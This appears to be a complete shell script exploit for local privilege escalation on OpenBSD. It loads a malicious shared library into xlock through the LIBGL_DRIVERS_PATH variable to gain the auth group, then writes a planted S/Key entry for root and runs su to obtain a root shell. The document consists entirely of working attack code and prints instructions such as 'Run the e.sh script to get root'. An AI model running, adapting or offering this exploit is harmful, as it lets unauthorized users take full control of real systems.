echo '#!/bin/sh

echo "Checking wether $(whoami) is part of the auth group..."
echo " "
id
echo " "
echo "$(whoami) is part of the auth group..."
echo " "
echo "Creating the s/key for root user inside /etc/skey..."

echo "root md5 0100 obsd91335 8b6d96e0ef1b1c21" > /etc/skey/root
echo "created the s/key for root...
"
echo "Giving the file apropriate permissions...
"
chmod 0600 /etc/skey/root

echo "Now You Just Have To Give The Password: EGG LARD GROW HOG DRAG LAIN"
env -i TERM=vt220 su -l -a skey' >e.sh

chmod 777 e.sh

echo "*
*
*"
echo "#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}" >swrast_dri.c

echo "[*]compiling the code..."
echo "[*]The final exploit has been created."
echo "[*]Run the e.sh script to get root"
gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
